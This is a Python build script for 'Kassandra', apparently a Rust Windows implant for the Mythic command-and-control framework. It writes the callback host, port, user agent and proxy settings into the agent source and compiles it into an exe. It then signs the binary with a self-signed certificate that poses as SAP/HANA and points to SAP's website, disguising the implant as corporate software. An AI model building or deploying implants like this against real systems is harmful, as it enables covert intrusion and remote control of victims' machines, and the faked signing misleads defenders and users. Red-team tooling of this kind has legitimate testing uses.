import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import tempfile
from distutils.dir_util import copy_tree
import asyncio
import os
import time
import base64
import subprocess

class KassandraAgent(PayloadType):
    name = "Kassandra"                                                     # Agent Name
    file_extension = "exe"                                            # Default file extension
    author = "@PatchRequest"                                          # Author
    supported_os = [SupportedOS.Windows]                              # OS Handled
    wrapper = False                                                   # If we want to use a wrapper like scarescrow
    wrapped_payloads = []                                             # If wrapper, list of wrapper payloads to use
    note = """Basic Implant in Rust"""                                   # Description
    supports_dynamic_loading = False                                  # Support of dynamic code loading
    c2_profiles = ["http"]                                            # Listener types 
    mythic_encrypts = False                                           # is the encryption handled by Mythic
    translation_container = "KassandraTranslator"                          # Translator service name 
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["exe"],
            default_value="exe"
        )
    ]                                             # Array if we want custom parameters during build
    agent_path = pathlib.Path(".") / "Kassandra"                           # Path of Kassandra
    agent_icon_path = agent_path / "agent_functions" / "Kassandra.svg"     # Path of the icon 
    agent_code_path = agent_path / "agent_code"                       # Path of the agent source code

    build_steps = [                                                   # Build steps
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Applying configuration", step_description="Stamping in configuration values"),
        BuildStep(step_name="Compiling", step_description="Stamping in configuration values")
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        Config = {
            "payload_uuid": self.uuid,
            "callback_host": "",
            "USER_AGENT": "",
            "httpMethod": "POST",
            "post_uri": "",
            "headers": [],
            "callback_port": 80,
            "ssl":False,
            "proxyEnabled": False,
            "proxy_host": "",
            "proxy_user": "",
            "proxy_pass": "",
        }
        stdout_err = ""
        for c2 in self.c2info:
            profile = c2.get_c2profile()
            for key, val in c2.get_parameters_dict().items():
                if isinstance(val, dict) and 'enc_key' in val:
                    stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
                    encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
                else:
                    Config[key] = val
            break

        if "https://" in Config["callback_host"]:
            Config["ssl"] = True

        Config["callback_host"] = Config["callback_host"].replace("https://", "").replace("http://","")
        if Config["proxy_host"] != "":
            Config["proxyEnabled"] = True
        # create the payload
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))
        agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
        copy_tree(str(self.agent_code_path), agent_build_path.name)
        

        config_path = pathlib.Path(agent_build_path.name) / "kassandra" / "src" / "config.rs"
        with open(config_path, "r+") as f:
            content = f.read()
            content = content.replace("%UUID%", Config["payload_uuid"])
            content = content.replace("%HOSTNAME%", Config["callback_host"])
            content = content.replace("%ENDPOINT%", Config["post_uri"])
            content = content.replace("%PORT%", str(Config["callback_port"]))
            content = content.replace("%USERAGENT%", Config["USER_AGENT"])
            content = content.replace("%PROXYURL%", Config["proxy_host"])
            content = content.replace("%SLEEPTIME%", str(Config["callback_interval"]))
            content = content.replace("%SSL%", "true" if Config["ssl"] else "false")
            content = content.replace("%PROXYENABLED%", "true" if Config["proxyEnabled"] else "false")

            f.seek(0)
            f.write(content)
            f.truncate()
            f.flush()                 # push Python’s buffers
            os.fsync(f.fileno())      # push OS buffers
    
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName="Applying configuration",
            StepStdout="All configuration setting applied",
            StepSuccess=True
        ))
        rustUpCommand = "rustup +nightly target add x86_64-pc-windows-gnu"
        proc = await asyncio.create_subprocess_shell(
            rustUpCommand,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        print(stdout)
        print(stderr)

        command = (
            f"cargo +nightly-2025-04-30 build --release --target x86_64-pc-windows-gnu --manifest-path {agent_build_path.name}/kassandra/Cargo.toml"
        )
        filename = f"{agent_build_path.name}/kassandra/target/x86_64-pc-windows-gnu/release/kassandra.exe"
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await proc.communicate()
        print(stdout)
        print(stderr)

        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName="Compiling",
            StepStdout=f"Successfully compiled Kassandra{stdout}{stderr}",
            StepSuccess=True
        ))
        pfx_path = generate_self_signed_cert()
        newName = filename.replace("kassandra.exe", "kassandraSigned.exe")
        sign_with_osslsigncode(filename, newName, pfx_path, "infected")

        resp.payload = open(newName, "rb").read()
        return resp



def generate_self_signed_cert(name="mycodecert", password="infected"):
    # Paths
    key = f"{name}.key"
    crt = f"{name}.crt"
    pfx = f"{name}.pfx"

    # Generate private key
    subprocess.run(["openssl", "genrsa", "-out", key, "2048"], check=True)

    # Generate self-signed certificate
    subprocess.run([
        "openssl", "req", "-new", "-x509",
        "-key", key,
        "-out", crt,
        "-days", "3650",
        "-subj", "/CN=SAP/O=HANA"
    ], check=True)

    # Convert to .pfx
    subprocess.run([
        "openssl", "pkcs12", "-export",
        "-out", pfx,
        "-inkey", key,
        "-in", crt,
        "-passout", f"pass:{password}"
    ], check=True)

    return pfx

def sign_with_osslsigncode(input_exe, output_exe, cert_pfx, pfx_pass):
    subprocess.run([
        "osslsigncode", "sign",
        "-pkcs12", cert_pfx,
        "-pass", pfx_pass,
        "-n", "Kassandra",
        "-i", "https://www.sap.com/germany/index.html",
        "-t", "http://timestamp.digicert.com",
        "-in", input_exe,
        "-out", output_exe
    ], check=True)